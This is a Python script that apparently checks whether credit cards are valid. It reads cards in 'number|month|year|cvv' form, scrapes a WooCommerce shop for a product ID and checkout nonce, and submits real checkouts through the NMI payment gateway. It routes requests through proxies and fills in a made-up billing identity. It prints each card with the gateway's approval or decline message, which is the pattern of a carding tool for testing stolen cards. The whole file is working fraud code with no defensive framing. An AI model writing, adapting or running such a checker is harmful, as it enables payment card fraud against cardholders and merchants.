from urllib.parse import urlparse
import requests
import json
import re

def stripTags(input_string):
    cleaned = re.sub(r'</?[^>]+(>|$)', '', input_string)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned

def nmi_api(url, creditCard, proxy):
    cc, mm, yy, cvv = creditCard.strip().split('|')
    domain = urlparse(url).hostname
    session = requests.Session()

    #requests 1
    try:
        response = session.get(url, proxies=proxy)

        id_match = re.search(r'/wp-json/wp/v2/product/([^"]+)"', response.text)
        if not id_match:
            return print(f"{cc}|{mm}|{yy}|{cvv} Product ID not found in the response.")
        id = id_match.group(1)

    except Exception as e:
        return print(f"requests 1 An error occurred during processing: {e}")

    #requests 2
    try:
        data = {
            'quantity': 1,
            'add-to-cart': id
        }

        response = session.post(url, data=data, proxies=proxy)

        if response.status_code not in (200, 302):
            return print(f'{cc}|{mm}|{yy}|{cvv} Failed to add item to cart.')

    except Exception as e:
        return print(f"requests 2 An error occurred during processing: {e}")
    
    #requests 3
    try:
        url = f"https://{domain}/checkout/"
        response = session.get(url, proxies=proxy)

        nonce_match = re.search(r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', response.text)
        if not nonce_match:
            return print("Checkout nonce not found in the response.")
        checkoutNonce = nonce_match.group(1)

    except Exception as e:
        return print(f"requests 3 An error occurred during processing: {e}")
    
    try:
        url = f"https://{domain}/?wc-ajax=checkout"
        data = {
            'billing_first_name': 'Danyka',
            'billing_last_name': 'Kunde',
            'billing_country': 'US',
            'billing_address_1': '90154 Alanna Rapid Suite 080',
            'billing_city': 'New York',
            'billing_state': 'NY',
            'billing_postcode': '10080',
            'billing_phone': '5809662076',
            'billing_email': 'DanykaKunde@gmail.com',
            'shipping_country': 'US',
            'shipping_state': 'KS',
            'shipping_method[0]': 'local_pickup:2',
            'payment_method': 'nmi',
            'nmi-card-number': cc,
            'nmi-card-expiry': f'{mm} / {yy}',
            'nmi-card-cvc': cvv,
            'woocommerce-process-checkout-nonce': checkoutNonce
        }

        response = session.post(url, data=data, proxies=proxy)
    
        if response.status_code == 200:
            status = stripTags(json.loads(response.text)["result"])
        
        if 'success' in status:
            receipt = stripTags(json.loads(response.text)["redirect"])
            return print(f"{cc}|{mm}|{yy}|{cvv} {receipt}")
        elif 'failure' in status:
            message = stripTags(json.loads(response.text)["messages"])
            return print(f"{cc}|{mm}|{yy}|{cvv} {message}")
        else:
            return print(f"{cc}|{mm}|{yy}|{cvv} {response.text}")

    except Exception as e:
        return print(f"requests 4 An error occurred during processing: {e}")